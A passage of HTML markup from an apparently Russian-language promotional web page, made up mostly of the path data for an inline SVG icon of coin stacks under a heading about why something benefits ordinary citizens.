              </div>
            </form>
            </div>
          </div>
        </div>
      </section>

      <section id="content" class="container pt-4 mb-32 mx-auto">
        <div class="w-full sm:flex sm:flex-col">
          <div
            class="inline-block sm:float-none float-left sm:-ml-4 sm:w-screen w-2/5"
          >
            <article
              class="p-8 sm:py-20 sm:px-4 flex flex-col bg-primary text-white"
            >
              <h3
                class="text-3xl sm:text-3xl font-ubuntu font-bold mb-8 sm:mb-16"
              >
                Почему это выгодно простым гражданам
              </h3>
              <div class="flex items-center mb-12">
                <div class="w-1/5">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="100%"
                    height="100%"
                    viewBox="0 0 80 80"
                    fill="none"
                  >
                    <path
                      d="M1.875 69.3872C1.875 69.3872 3.12504 70.625 8.12488 70.625C13.1247 70.625 14.3749 69.3872 14.3749 69.3872V73.125C14.3749 73.125 13.1249 74.3748 8.12488 74.3748C3.12488 74.3748 1.875 73.125 1.875 73.125V69.3872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M8.12488 70.6249C3.12488 70.6249 1.875 69.3871 1.875 69.3871V69.3749C1.875 69.3749 3.12504 68.125 8.12488 68.125C13.1247 68.125 14.3749 69.3749 14.3749 69.3749V69.3871C14.3749 69.3871 13.1249 70.6249 8.12488 70.6249Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M4.37508 70.3199C2.45372 69.9536 1.875 69.3872 1.875 69.3872V73.125C1.875 73.125 2.45372 73.6974 4.37508 74.0672V70.3199Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M11.875 70.3199C13.7964 69.9536 14.3749 69.3872 14.3749 69.3872V73.125C14.3749 73.125 13.7964 73.6974 11.875 74.0672V70.3199Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M18.125 69.3872C18.125 69.3872 19.375 70.625 24.3749 70.625C29.3747 70.625 30.6249 69.3872 30.6249 69.3872V73.125C30.6249 73.125 29.3749 74.3748 24.3749 74.3748C19.3749 74.3748 18.125 73.125 18.125 73.125V69.3872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M24.3749 70.6249C19.3749 70.6249 18.125 69.3871 18.125 69.3871V69.3749C18.125 69.3749 19.375 68.125 24.3749 68.125C29.3747 68.125 30.6249 69.3749 30.6249 69.3749V69.3871C30.6249 69.3871 29.3749 70.6249 24.3749 70.6249Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M20.6249 70.3199C18.7036 69.9536 18.125 69.3872 18.125 69.3872V73.125C18.125 73.125 18.7036 73.6974 20.6249 74.0672V70.3199Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M28.1251 70.3199C30.0465 69.9536 30.625 69.3872 30.625 69.3872V73.125C30.625 73.125 30.0465 73.6974 28.1251 74.0672V70.3199Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M18.125 60.6372C18.125 60.6372 19.375 61.8749 24.3749 61.8749C29.3747 61.8749 30.6249 60.6372 30.6249 60.6372V64.3748C30.6249 64.3748 29.3749 65.6249 24.3749 65.6249C19.3749 65.6249 18.125 64.3748 18.125 64.3748V60.6372Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M24.3749 61.8749C19.3749 61.8749 18.125 60.6372 18.125 60.6372V60.625C18.125 60.625 19.375 59.375 24.3749 59.375C29.3747 59.375 30.6249 60.625 30.6249 60.625V60.6372C30.6249 60.6372 29.3749 61.8749 24.3749 61.8749Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M20.6249 61.5697C18.7036 61.2036 18.125 60.6372 18.125 60.6372V64.3748C18.125 64.3748 18.7036 64.9473 20.6249 65.3172V61.5697Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M28.1251 61.5697C30.0465 61.2036 30.625 60.6372 30.625 60.6372V64.3748C30.625 64.3748 30.0465 64.9473 28.1251 65.3172V61.5697Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M34.375 69.3872C34.375 69.3872 35.625 70.625 40.6249 70.625C45.6249 70.625 46.8749 69.3872 46.8749 69.3872V73.125C46.8749 73.125 45.6249 74.3748 40.6249 74.3748C35.625 74.3748 34.375 73.125 34.375 73.125V69.3872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M40.6249 70.6249C35.625 70.6249 34.375 69.3871 34.375 69.3871V69.3749C34.375 69.3749 35.625 68.125 40.6249 68.125C45.6249 68.125 46.8749 69.3749 46.8749 69.3749V69.3871C46.8749 69.3871 45.6249 70.6249 40.6249 70.6249Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M36.8751 70.3199C34.9537 69.9536 34.375 69.3872 34.375 69.3872V73.125C34.375 73.125 34.9537 73.6974 36.8751 74.0672V70.3199Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M44.3749 70.3199C46.2964 69.9536 46.875 69.3872 46.875 69.3872V73.125C46.875 73.125 46.2964 73.6974 44.3749 74.0672V70.3199Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M34.375 60.6372C34.375 60.6372 35.625 61.8749 40.6249 61.8749C45.6249 61.8749 46.8749 60.6372 46.8749 60.6372V64.3748C46.8749 64.3748 45.6249 65.6249 40.6249 65.6249C35.625 65.6249 34.375 64.3748 34.375 64.3748V60.6372Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M40.6249 61.8749C35.625 61.8749 34.375 60.6372 34.375 60.6372V60.625C34.375 60.625 35.625 59.375 40.6249 59.375C45.6249 59.375 46.8749 60.625 46.8749 60.625V60.6372C46.8749 60.6372 45.6249 61.8749 40.6249 61.8749Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M36.8751 61.5697C34.9537 61.2036 34.375 60.6372 34.375 60.6372V64.3748C34.375 64.3748 34.9537 64.9473 36.8751 65.3172V61.5697Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M44.3749 61.5697C46.2964 61.2036 46.875 60.6372 46.875 60.6372V64.3748C46.875 64.3748 46.2964 64.9473 44.3749 65.3172V61.5697Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M34.375 51.8872C34.375 51.8872 35.625 53.1249 40.6249 53.1249C45.6249 53.1249 46.8749 51.8872 46.8749 51.8872V55.625C46.8749 55.625 45.6249 56.8749 40.6249 56.8749C35.625 56.8749 34.375 55.625 34.375 55.625V51.8872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M40.6249 53.1248C35.625 53.1248 34.375 51.8871 34.375 51.8871V51.8749C34.375 51.8749 35.625 50.625 40.6249 50.625C45.6249 50.625 46.8749 51.8749 46.8749 51.8749V51.8871C46.8749 51.8871 45.6249 53.1248 40.6249 53.1248Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M36.8751 52.8197C34.9537 52.4536 34.375 51.8872 34.375 51.8872V55.625C34.375 55.625 34.9537 56.1974 36.8751 56.5672V52.8197Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M44.3749 52.8197C46.2964 52.4536 46.875 51.8872 46.875 51.8872V55.625C46.875 55.625 46.2964 56.1974 44.3749 56.5672V52.8197Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M50.6249 69.3872C50.6249 69.3872 51.8749 70.625 56.8749 70.625C61.8749 70.625 63.125 69.3872 63.125 69.3872V73.125C63.125 73.125 61.8749 74.3748 56.8749 74.3748C51.8749 74.3748 50.6249 73.125 50.6249 73.125V69.3872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M56.8749 70.6249C51.8749 70.6249 50.6249 69.3871 50.6249 69.3871V69.3749C50.6249 69.3749 51.8749 68.125 56.8749 68.125C61.8749 68.125 63.125 69.3749 63.125 69.3749V69.3871C63.125 69.3871 61.8748 70.6249 56.8749 70.6249Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M53.1248 70.3199C51.2034 69.9536 50.6249 69.3872 50.6249 69.3872V73.125C50.6249 73.125 51.2034 73.6974 53.1248 74.0672V70.3199Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M60.6248 70.3199C62.5463 69.9536 63.1248 69.3872 63.1248 69.3872V73.125C63.1248 73.125 62.5463 73.6974 60.6248 74.0672V70.3199Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M50.6249 60.6372C50.6249 60.6372 51.8749 61.8749 56.8749 61.8749C61.8749 61.8749 63.125 60.6372 63.125 60.6372V64.3748C63.125 64.3748 61.8749 65.6249 56.8749 65.6249C51.8749 65.6249 50.6249 64.3748 50.6249 64.3748V60.6372Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M56.8749 61.8749C51.8749 61.8749 50.6249 60.6372 50.6249 60.6372V60.625C50.6249 60.625 51.8749 59.375 56.8749 59.375C61.8749 59.375 63.125 60.625 63.125 60.625V60.6372C63.125 60.6372 61.8748 61.8749 56.8749 61.8749Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M53.1248 61.5697C51.2034 61.2036 50.6249 60.6372 50.6249 60.6372V64.3748C50.6249 64.3748 51.2034 64.9473 53.1248 65.3172V61.5697Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M60.6248 61.5697C62.5463 61.2036 63.1248 60.6372 63.1248 60.6372V64.3748C63.1248 64.3748 62.5463 64.9473 60.6248 65.3172V61.5697Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M50.6249 51.8872C50.6249 51.8872 51.8749 53.1249 56.8749 53.1249C61.8749 53.1249 63.125 51.8872 63.125 51.8872V55.625C63.125 55.625 61.8749 56.8749 56.8749 56.8749C51.8749 56.8749 50.6249 55.625 50.6249 55.625V51.8872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M56.8749 53.1248C51.8749 53.1248 50.6249 51.8871 50.6249 51.8871V51.8749C50.6249 51.8749 51.8749 50.625 56.8749 50.625C61.8749 50.625 63.125 51.8749 63.125 51.8749V51.8871C63.125 51.8871 61.8748 53.1248 56.8749 53.1248Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M53.1248 52.8197C51.2034 52.4536 50.6249 51.8872 50.6249 51.8872V55.625C50.6249 55.625 51.2034 56.1974 53.1248 56.5672V52.8197Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M60.6248 52.8197C62.5463 52.4536 63.1248 51.8872 63.1248 51.8872V55.625C63.1248 55.625 62.5463 56.1974 60.6248 56.5672V52.8197Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M50.6249 43.1372C50.6249 43.1372 51.8749 44.375 56.8749 44.375C61.8749 44.375 63.125 43.1372 63.125 43.1372V46.875C63.125 46.875 61.8749 48.1248 56.8749 48.1248C51.8749 48.1248 50.6249 46.875 50.6249 46.875V43.1372Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M56.8749 44.3749C51.8749 44.3749 50.6249 43.1371 50.6249 43.1371V43.1249C50.6249 43.1249 51.8749 41.875 56.8749 41.875C61.8749 41.875 63.125 43.1249 63.125 43.1249V43.1371C63.125 43.1371 61.8748 44.3749 56.8749 44.3749Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M53.1248 44.0699C51.2034 43.7036 50.6249 43.1372 50.6249 43.1372V46.875C50.6249 46.875 51.2034 47.4474 53.1248 47.8172V44.0699Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M60.6248 44.0699C62.5463 43.7036 63.1248 43.1372 63.1248 43.1372V46.875C63.1248 46.875 62.5463 47.4474 60.6248 47.8172V44.0699Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M66.8748 69.3872C66.8748 69.3872 68.1248 70.625 73.1248 70.625C78.1248 70.625 79.3748 69.3872 79.3748 69.3872V73.125C79.3748 73.125 78.1248 74.3748 73.1248 74.3748C68.1248 74.3748 66.8748 73.125 66.8748 73.125V69.3872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M73.1248 70.6249C68.1248 70.6249 66.8748 69.3871 66.8748 69.3871V69.3749C66.8748 69.3749 68.1248 68.125 73.1248 68.125C78.1248 68.125 79.3748 69.3749 79.3748 69.3749V69.3871C79.3748 69.3871 78.1248 70.6249 73.1248 70.6249Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M69.3748 70.3199C67.4534 69.9536 66.8749 69.3872 66.8749 69.3872V73.125C66.8749 73.125 67.4534 73.6974 69.3748 74.0672V70.3199Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M76.8748 70.3199C78.7961 69.9536 79.3748 69.3872 79.3748 69.3872V73.125C79.3748 73.125 78.7961 73.6974 76.8748 74.0672V70.3199Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M66.8748 60.6372C66.8748 60.6372 68.1248 61.8749 73.1248 61.8749C78.1248 61.8749 79.3748 60.6372 79.3748 60.6372V64.3748C79.3748 64.3748 78.1248 65.6249 73.1248 65.6249C68.1248 65.6249 66.8748 64.3748 66.8748 64.3748V60.6372Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M73.1248 61.8749C68.1248 61.8749 66.8748 60.6372 66.8748 60.6372V60.625C66.8748 60.625 68.1248 59.375 73.1248 59.375C78.1248 59.375 79.3748 60.625 79.3748 60.625V60.6372C79.3748 60.6372 78.1248 61.8749 73.1248 61.8749Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M69.3748 61.5697C67.4534 61.2036 66.8749 60.6372 66.8749 60.6372V64.3748C66.8749 64.3748 67.4534 64.9473 69.3748 65.3172V61.5697Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M76.8748 61.5697C78.7961 61.2036 79.3748 60.6372 79.3748 60.6372V64.3748C79.3748 64.3748 78.7961 64.9473 76.8748 65.3172V61.5697Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M66.8748 51.8872C66.8748 51.8872 68.1248 53.1249 73.1248 53.1249C78.1248 53.1249 79.3748 51.8872 79.3748 51.8872V55.625C79.3748 55.625 78.1248 56.8749 73.1248 56.8749C68.1248 56.8749 66.8748 55.625 66.8748 55.625V51.8872Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M73.1248 53.1248C68.1248 53.1248 66.8748 51.8871 66.8748 51.8871V51.8749C66.8748 51.8749 68.1248 50.625 73.1248 50.625C78.1248 50.625 79.3748 51.8749 79.3748 51.8749V51.8871C79.3748 51.8871 78.1248 53.1248 73.1248 53.1248Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M69.3748 52.8197C67.4534 52.4536 66.8749 51.8872 66.8749 51.8872V55.625C66.8749 55.625 67.4534 56.1974 69.3748 56.5672V52.8197Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M76.8748 52.8197C78.7961 52.4536 79.3748 51.8872 79.3748 51.8872V55.625C79.3748 55.625 78.7961 56.1974 76.8748 56.5672V52.8197Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M66.8748 43.1372C66.8748 43.1372 68.1248 44.375 73.1248 44.375C78.1248 44.375 79.3748 43.1372 79.3748 43.1372V46.875C79.3748 46.875 78.1248 48.1248 73.1248 48.1248C68.1248 48.1248 66.8748 46.875 66.8748 46.875V43.1372Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M73.1248 44.3749C68.1248 44.3749 66.8748 43.1371 66.8748 43.1371V43.1249C66.8748 43.1249 68.1248 41.875 73.1248 41.875C78.1248 41.875 79.3748 43.1249 79.3748 43.1249V43.1371C79.3748 43.1371 78.1248 44.3749 73.1248 44.3749Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M69.3748 44.0699C67.4534 43.7036 66.8749 43.1372 66.8749 43.1372V46.875C66.8749 46.875 67.4534 47.4474 69.3748 47.8172V44.0699Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M76.8748 44.0699C78.7961 43.7036 79.3748 43.1372 79.3748 43.1372V46.875C79.3748 46.875 78.7961 47.4474 76.8748 47.8172V44.0699Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M76.8748 35.6255C75.8371 36.4129 74.5372 36.8755 73.1248 36.8755C71.7124 36.8755 70.4123 36.4129 69.3747 35.6255C67.8623 34.4879 66.8748 32.6629 66.8748 30.6255V33.1254C66.8748 35.1627 67.8623 36.9877 69.3747 38.1254C70.4123 38.9128 71.7122 39.3755 73.1248 39.3755C74.537 39.3755 75.8371 38.9128 76.8748 38.1254C78.3873 36.9878 79.3748 35.1628 79.3748 33.1254V30.6255C79.3748 32.6629 78.3873 34.4879 76.8748 35.6255Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M73.1248 36.8756C71.7124 36.8756 70.4123 36.4129 69.3747 35.6255C67.8623 34.488 66.8748 32.6629 66.8748 30.6255C66.8748 27.1757 69.675 24.3755 73.1248 24.3755C76.5744 24.3755 79.3748 27.1757 79.3748 30.6255C79.3748 32.6628 78.3873 34.4878 76.8748 35.6255C75.8371 36.4129 74.5372 36.8756 73.1248 36.8756Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M70.6248 35.6255C69.1123 34.488 68.1249 32.6629 68.1249 30.6255C68.1249 27.3906 70.5981 24.7565 73.7499 24.439C73.5411 24.4169 73.3397 24.3755 73.1249 24.3755C69.6751 24.3755 66.8749 27.1757 66.8749 30.6255C66.8749 32.6628 67.8625 34.4878 69.3748 35.6255C70.4124 36.4129 71.7124 36.8756 73.1249 36.8756C73.3372 36.8756 73.5424 36.8451 73.7499 36.8243C72.5828 36.7084 71.5062 36.2945 70.6248 35.6255Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M75.6249 35.6255C77.1372 34.488 78.1248 32.6629 78.1248 30.6255C78.1248 27.3906 75.6516 24.7565 72.4998 24.439C72.7084 24.4169 72.9099 24.3755 73.1248 24.3755C76.5744 24.3755 79.3748 27.1757 79.3748 30.6255C79.3748 32.6628 78.3872 34.4878 76.8747 35.6255C75.8371 36.4129 74.5372 36.8756 73.1248 36.8756C72.9124 36.8756 72.7072 36.8451 72.4998 36.8243C73.6667 36.7084 74.7435 36.2945 75.6249 35.6255Z"
                      fill="#5C9EFF"
                    ></path>
                    <path
                      d="M5.625 54.3752L6.87504 48.1251H0.625C36.7186 22.8134 68.1248 9.37594 68.1248 9.37594L66.8747 5.62598L79.3748 6.87602L70.6248 16.876L69.3748 13.1261C69.3748 13.1259 19.375 40.6258 5.625 54.3752Z"
                      fill="#D7E9FF"
                    ></path>
                    <path
                      d="M68.7889 12.0317C46.9529 24.1802 22.9297 38.1646 5.93501 52.8221L5.625 54.3749C19.375 40.6256 69.3748 13.1257 69.3748 13.1257L68.7889 12.0317Z"
                      fill="#94C1FF"
                    ></path>
                    <path
                      d="M68.1248 9.37598C68.1248 9.37598 36.7186 22.8134 0.625 48.1252H3.12492C39.2187 22.8134 68.4435 10.3367 68.4435 10.3367L68.1248 9.37598Z"
                      fill="white"
                    ></path>
                    <path
                      d="M24.375 73.7499C24.0297 73.7499 23.75 73.4704 23.75 73.1249V71.875C23.75 71.5295 24.0297 71.25 24.375 71.25C24.7205 71.25 25 71.5295 25 71.875V73.1249C25 73.4704 24.7205 73.7499 24.375 73.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M28.125 73.4438C27.7795 73.4438 27.5 73.1643 27.5 72.8188V71.586C27.5 71.2404 27.7795 70.9609 28.125 70.9609C28.4704 70.9609 28.75 71.2404 28.75 71.586V72.8188C28.7499 73.1643 28.4704 73.4438 28.125 73.4438Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M20.625 73.4316C20.2797 73.4316 20 73.1521 20 72.8066V71.5689C20 71.2234 20.2795 70.9438 20.625 70.9438C20.9705 70.9438 21.25 71.2234 21.25 71.5689V72.8066C21.25 73.1521 20.9704 73.4316 20.625 73.4316Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M24.375 71.25C19.264 71.25 17.8297 69.9632 17.6831 69.817C17.439 69.5726 17.439 69.1772 17.6831 68.9332C17.9237 68.6927 18.3117 68.6889 18.5546 68.9223C18.6034 68.9625 19.8888 70.0001 24.3749 70.0001C28.9292 70.0001 30.1843 68.9309 30.1965 68.9212C30.4491 68.6964 30.8397 68.7038 31.073 68.9528C31.3048 69.1982 31.3061 69.5778 31.0669 69.8171C30.9205 69.9632 29.4861 71.25 24.375 71.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M24.375 74.9999C19.264 74.9999 17.8297 73.7133 17.6831 73.5669C17.439 73.3227 17.439 72.9271 17.6831 72.6831C17.9237 72.4427 18.3117 72.439 18.5546 72.6722C18.6034 72.7125 19.8888 73.7502 24.3749 73.7502C28.9292 73.7502 30.1843 72.6808 30.1965 72.6711C30.4491 72.4465 30.8397 72.4551 31.073 72.7028C31.3048 72.9481 31.3061 73.3279 31.0669 73.567C30.9205 73.7133 29.4861 74.9999 24.375 74.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M30.6249 70.0001C30.4699 70.0001 30.3149 69.9427 30.1952 69.8279C30.1464 69.7877 28.861 68.75 24.3749 68.75C19.8205 68.75 18.5656 69.8194 18.5534 69.829C18.3019 70.0537 17.9088 70.0464 17.6769 69.7974C17.4449 69.552 17.4436 69.1724 17.683 68.9332C17.8295 68.7865 19.2638 67.5 24.3749 67.5C29.4859 67.5 30.9204 68.7866 31.0668 68.9332C31.3109 69.1774 31.3109 69.5728 31.0668 69.8169C30.9446 69.9389 30.7847 70.0001 30.6249 70.0001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M18.125 73.75C17.7797 73.75 17.5 73.4705 17.5 73.125V69.3749C17.5 69.0295 17.7795 68.75 18.125 68.75C18.4705 68.75 18.75 69.0295 18.75 69.3749V73.125C18.7499 73.4705 18.4704 73.75 18.125 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M30.625 73.75C30.2795 73.75 30 73.4705 30 73.125V69.3749C30 69.0295 30.2795 68.75 30.625 68.75C30.9704 68.75 31.25 69.0295 31.25 69.3749V73.125C31.25 73.4705 30.9705 73.75 30.625 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M8.12502 73.7499C7.77966 73.7499 7.5 73.4704 7.5 73.1249V71.875C7.5 71.5295 7.77951 71.25 8.12502 71.25C8.47053 71.25 8.75004 71.5295 8.75004 71.875V73.1249C8.7502 73.4704 8.47053 73.7499 8.12502 73.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M11.875 73.4438C11.5295 73.4438 11.25 73.1643 11.25 72.8188V71.586C11.25 71.2404 11.5295 70.9609 11.875 70.9609C12.2204 70.9609 12.5 71.2404 12.5 71.586V72.8188C12.5 73.1643 12.2205 73.4438 11.875 73.4438Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M4.37502 73.4316C4.02951 73.4316 3.75 73.1521 3.75 72.8066V71.5689C3.75 71.2234 4.02951 70.9438 4.37502 70.9438C4.72038 70.9438 5.00004 71.2234 5.00004 71.5689V72.8066C4.99988 73.1521 4.72038 73.4316 4.37502 73.4316Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M8.12502 71.25C3.01397 71.25 1.57968 69.9632 1.43312 69.817C1.18896 69.5726 1.18896 69.1772 1.43312 68.9332C1.67368 68.6927 2.06174 68.6889 2.3048 68.9223C2.3536 68.9625 3.63899 70.0001 8.12502 70.0001C12.6794 70.0001 13.9345 68.9309 13.9467 68.9212C14.1993 68.6964 14.5912 68.7038 14.8232 68.9528C15.055 69.1982 15.0562 69.5778 14.8171 69.8171C14.6705 69.9632 13.2362 71.25 8.12502 71.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M8.12502 74.9999C3.01397 74.9999 1.57968 73.7133 1.43312 73.5669C1.18896 73.3227 1.18896 72.9271 1.43312 72.6831C1.67368 72.4427 2.06174 72.439 2.3048 72.6722C2.3536 72.7125 3.63899 73.7502 8.12502 73.7502C12.6794 73.7502 13.9345 72.6808 13.9467 72.6711C14.1993 72.4465 14.5912 72.4551 14.8232 72.7028C15.055 72.9481 15.0562 73.3279 14.8171 73.567C14.6705 73.7133 13.2362 74.9999 8.12502 74.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M14.3749 70.0001C14.2199 70.0001 14.0649 69.9427 13.9452 69.8279C13.8964 69.7877 12.611 68.75 8.12485 68.75C3.57047 68.75 2.31558 69.8194 2.30338 69.829C2.05187 70.0537 1.65881 70.0464 1.42685 69.7974C1.1949 69.552 1.19364 69.1724 1.43295 68.9332C1.57951 68.7865 3.0138 67.5 8.12485 67.5C13.2359 67.5 14.6704 68.7866 14.8168 68.9332C15.0609 69.1774 15.0609 69.5728 14.8168 69.8169C14.6948 69.9389 14.5349 70.0001 14.3749 70.0001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M1.87502 73.75C1.52966 73.75 1.25 73.4705 1.25 73.125V69.3749C1.25 69.0295 1.52951 68.75 1.87502 68.75C2.22053 68.75 2.50004 69.0295 2.50004 69.3749V73.125C2.50004 73.4705 2.22038 73.75 1.87502 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M14.375 73.75C14.0295 73.75 13.75 73.4705 13.75 73.125V69.3749C13.75 69.0295 14.0295 68.75 14.375 68.75C14.7204 68.75 15 69.0295 15 69.3749V73.125C15.0002 73.4705 14.7205 73.75 14.375 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M24.375 64.9999C24.0297 64.9999 23.75 64.7204 23.75 64.3749V63.125C23.75 62.7795 24.0297 62.5 24.375 62.5C24.7205 62.5 25 62.7795 25 63.125V64.3749C25 64.7204 24.7205 64.9999 24.375 64.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M28.125 64.6938C27.7795 64.6938 27.5 64.4143 27.5 64.0688V62.836C27.5 62.4904 27.7795 62.2109 28.125 62.2109C28.4704 62.2109 28.75 62.4904 28.75 62.836V64.0688C28.7499 64.4143 28.4704 64.6938 28.125 64.6938Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M20.625 64.6816C20.2797 64.6816 20 64.4021 20 64.0565V62.8189C20 62.4734 20.2795 62.1938 20.625 62.1938C20.9705 62.1938 21.25 62.4734 21.25 62.8189V64.0565C21.25 64.4021 20.9704 64.6816 20.625 64.6816Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M24.375 62.5C19.264 62.5 17.8297 61.2134 17.6831 61.067C17.439 60.8226 17.439 60.4272 17.6831 60.1832C17.9237 59.9427 18.3117 59.9389 18.5546 60.1723C18.6034 60.2125 19.8888 61.2503 24.3749 61.2503C28.9292 61.2503 30.1843 60.1809 30.1965 60.1712C30.4491 59.9464 30.8397 59.9538 31.073 60.2028C31.3048 60.4482 31.3061 60.8278 31.0669 61.0671C30.9205 61.2134 29.4861 62.5 24.375 62.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M24.375 66.25C19.264 66.25 17.8297 64.9632 17.6831 64.8168C17.439 64.5727 17.439 64.1773 17.6831 63.9331C17.9237 63.6927 18.3117 63.689 18.5546 63.9222C18.6034 63.9625 19.8888 65.0002 24.3749 65.0002C28.9292 65.0002 30.1843 63.9308 30.1965 63.9211C30.4491 63.6977 30.8397 63.7051 31.073 63.9528C31.3048 64.1982 31.3061 64.5778 31.0669 64.817C30.9205 64.9634 29.4861 66.25 24.375 66.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M30.6249 61.2502C30.4699 61.2502 30.3149 61.1928 30.1952 61.078C30.1464 61.0377 28.861 60 24.3749 60C19.8205 60 18.5656 61.0694 18.5534 61.079C18.3019 61.3037 17.9088 61.2964 17.6769 61.0474C17.4449 60.802 17.4436 60.4223 17.683 60.1832C17.8295 60.0366 19.2638 58.75 24.3749 58.75C29.4859 58.75 30.9204 60.0368 31.0668 60.1832C31.3109 60.4274 31.3109 60.8228 31.0668 61.0669C30.9446 61.1892 30.7847 61.2502 30.6249 61.2502Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M18.125 65C17.7797 65 17.5 64.7205 17.5 64.375V60.625C17.5 60.2795 17.7795 60 18.125 60C18.4705 60 18.75 60.2795 18.75 60.625V64.375C18.7499 64.7205 18.4704 65 18.125 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M30.625 65C30.2795 65 30 64.7205 30 64.375V60.625C30 60.2795 30.2795 60 30.625 60C30.9704 60 31.25 60.2795 31.25 60.625V64.375C31.25 64.7205 30.9705 65 30.625 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 73.7499C40.2794 73.7499 39.9999 73.4704 39.9999 73.1249V71.875C39.9999 71.5295 40.2794 71.25 40.6249 71.25C40.9704 71.25 41.2499 71.5295 41.2499 71.875V73.1249C41.2499 73.4704 40.9704 73.7499 40.6249 73.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M44.3749 73.4438C44.0295 73.4438 43.75 73.1643 43.75 72.8188V71.586C43.75 71.2404 44.0295 70.9609 44.3749 70.9609C44.7204 70.9609 44.9999 71.2404 44.9999 71.586V72.8188C44.9999 73.1643 44.7204 73.4438 44.3749 73.4438Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M36.8751 73.4316C36.5298 73.4316 36.2501 73.1521 36.2501 72.8066V71.5689C36.2501 71.2234 36.5296 70.9438 36.8751 70.9438C37.2207 70.9438 37.5002 71.2234 37.5002 71.5689V72.8066C37.5 73.1521 37.2205 73.4316 36.8751 73.4316Z"
                      fill="#116FFF"
                    ></path>
                    <path
